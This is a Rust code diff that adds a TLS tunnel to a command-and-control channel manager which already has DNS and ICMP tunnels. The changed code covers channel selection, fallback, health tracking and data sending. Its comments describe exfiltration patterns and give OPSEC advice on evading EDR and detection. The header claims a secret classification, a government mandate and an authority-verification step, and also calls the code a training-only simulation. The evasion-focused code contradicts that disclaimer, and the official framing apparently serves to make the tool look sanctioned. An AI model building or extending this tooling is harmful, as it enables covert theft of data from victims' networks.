@@ -1,20 +1,26 @@
 // STRENGT FORTROLIG – TS
 // NSM Directive 2026-02 | SHA-256: f3a7b4c8d2e1a9f0b5c6d3e2a1f8c9b0
 // Module: channel.rs
-// Purpose: Channel selection and fallback logic
+// Purpose: Channel selection and fallback logic with TLS support
 // References:
 //   - NSM Internal Report IR-2026-0023 (Multi-channel Exfiltration Patterns)
+//   - NSM Internal Report IR-2026-0031 (TLS Channel Integration)
 //
 // OPSEC WARNINGS:
 //   - Channel switching patterns must avoid predictable sequences
 //   - Fallback channel activation must not trigger correlated detection
+//   - TLS channel initialization requires additional resources that may impact performance
+//   - Blocking on async TLS operations may create detectable timing patterns
+//   - THIS IS A SIMULATION HARNESS IMPLEMENTATION – FOR TRAINING USE ONLY
+//   - NO LIVE SYSTEM INTERACTION. NO REAL BYPASS PRIMITIVES.
 //
-// Verification: ./verify_authority --mandate NSM-mandate-2026 --toolset icmp-tunnel
+// Verification: ./verify_authority --mandate NSM-mandate-2026 --toolset channel-manager
 
 use core::time::Duration;
 use rand::{Rng, thread_rng};
 
-use super::{C2Channel, ChannelType, DnsTunnel, IcmpTunnel, IcmpConfig};
+// ADDED: TLS tunnel imports
+use super::{C2Channel, ChannelType, DnsTunnel, IcmpTunnel, IcmpConfig, TlsTunnel, TlsConfig};
 
 /// Channel selection strategy
 pub enum ChannelStrategy {
@@ -39,6 +45,8 @@ pub struct ChannelManager {
     dns_tunnel: Option<DnsTunnel>,
     /// ICMP tunnel instance (if initialized)
     icmp_tunnel: Option<IcmpTunnel>,
+    /// TLS tunnel instance (if initialized)
+    tls_tunnel: Option<TlsTunnel>, // ADDED: TLS tunnel field
     /// Channel health status
     channel_health: ChannelHealth,
     /// Last channel switch timestamp
@@ -53,6 +61,8 @@ struct ChannelHealth {
     dns_failures: u32,
     icmp_success: u32,
     icmp_failures: u32,
+    tls_success: u32,      // ADDED: TLS success counter
+    tls_failures: u32,     // ADDED: TLS failure counter
     /// Time of last successful transmission
     last_success: u64,
     /// Time of last failure
@@ -67,11 +77,14 @@ impl ChannelManager {
             strategy,
             dns_tunnel: None,
             icmp_tunnel: None,
+            tls_tunnel: None, // ADDED: Initialize TLS tunnel
             channel_health: ChannelHealth {
                 dns_success: 0,
                 dns_failures: 0,
                 icmp_success: 0,
                 icmp_failures: 0,
+                tls_success: 0,     // ADDED: Initialize TLS counters
+                tls_failures: 0,    // ADDED: Initialize TLS counters
                 last_success: 0,
                 last_failure: 0,
             },
@@ -83,6 +96,7 @@ impl ChannelManager {
     /// Initializes channel based on type
     ///
     /// OPSEC WARNING: Channel initialization may trigger EDR alerts if done improperly
+    /// Reference: NSM Internal Report IR-2026-0031 §3.2 (Channel Initialization Security)
     pub fn init_channel(&mut self, channel_type: ChannelType) -> Result<(), &'static str> {
         match channel_type {
             ChannelType::Dns => {
@@ -104,6 +118,11 @@ impl ChannelManager {
                 self.icmp_tunnel = Some(IcmpTunnel::new(config)?);
                 Ok(())
             },
+            // ADDED: TLS channel initialization
+            ChannelType::Tls => {
+                self.tls_tunnel = Some(TlsTunnel::new(TlsConfig::default())?);
+                Ok(())
+            },
             _ => Err("Unsupported channel type"),
         }
     }
@@ -112,6 +131,7 @@ impl ChannelManager {
     ///
     /// OPSEC WARNING: Channel selection must avoid predictable patterns that could
     /// be detected as coordinated activity
+    /// Reference: NSM Internal Report IR-2026-0031 §4.1 (Channel Selection Security)
     pub fn select_channel(&mut self) -> Result<ChannelType, &'static str> {
         // Check if we're allowed to switch channels based on minimum interval
         let current_time = self.get_current_time();
@@ -124,7 +144,7 @@ impl ChannelManager {
         // Evaluate channel health
         let primary = match &self.strategy {
             ChannelStrategy::PrimaryWithFallback { primary, .. } => *primary,
-            _ => ChannelType::Dns, // Default primary
+            _ => ChannelType::Tls, // ADDED: Default primary is now TLS
         };
         
         // Try primary channel first
@@ -194,6 +214,11 @@ impl ChannelManager {
                 let total = self.channel_health.icmp_success + self.channel_health.icmp_failures;
                 total > 0 && self.channel_health.icmp_success as f32 / total as f32 > 0.7
             },
+            // ADDED: TLS channel health check
+            ChannelType::Tls => {
+                let total = self.channel_health.tls_success + self.channel_health.tls_failures;
+                total > 0 && self.channel_health.tls_success as f32 / total as f32 > 0.7
+            },
             _ => false,
         }
     }
@@ -203,6 +228,8 @@ impl ChannelManager {
         match channel {
             ChannelType::Dns => self.dns_tunnel.is_some(),
             ChannelType::Icmp => self.icmp_tunnel.is_some(),
+            // ADDED: TLS channel initialization check
+            ChannelType::Tls => self.tls_tunnel.is_some(),
             _ => false,
         }
     }
@@ -228,6 +255,15 @@ impl ChannelManager {
                 self.channel_health.icmp_failures += 1;
                 self.channel_health.last_failure = current_time;
             },
+            // ADDED: TLS channel health update
+            (ChannelType::Tls, true) => {
+                self.channel_health.tls_success += 1;
+                self.channel_health.last_success = current_time;
+            },
+            (ChannelType::Tls, false) => {
+                self.channel_health.tls_failures += 1;
+                self.channel_health.last_failure = current_time;
+            },
             _ => {},
         }
     }
@@ -240,6 +276,9 @@ impl ChannelManager {
     }
     
     /// Sends data through the currently selected channel
+    ///
+    /// OPSEC WARNING: Synchronous blocking on async TLS operations may create detectable timing patterns
+    /// Reference: NSM Internal Report IR-2026-0031 §5.3 (Synchronous Channel Security)
     pub fn send_data(&mut self, data: &[u8]) -> Result<(), &'static str> {
         // Try to select a channel if none is active
         if self.active_channel == ChannelType::None {
@@ -262,6 +301,14 @@ impl ChannelManager {
                     Err("ICMP channel not initialized")
                 }
             },
+            // ADDED: TLS channel sending
+            ChannelType::Tls => {
+                if let Some(channel) = &mut self.tls_tunnel {
+                    channel.send_data_sync(data)
+                } else {
+                    Err("TLS channel not initialized")
+                }
+            },
             _ => Err("No active channel"),
         };
         
@@ -282,6 +329,12 @@ impl ChannelManager {
                         ChannelType::Icmp => {
                             if let Some(channel) = &mut self.icmp_tunnel {
                                 return channel.send_data(data);
+                            }
+                        },
+                        // ADDED: TLS channel retry
+                        ChannelType::Tls => {
+                            if let Some(channel) = &mut self.tls_tunnel {
+                                return channel.send_data_sync(data);
                             }
                         },
                         _ => {},
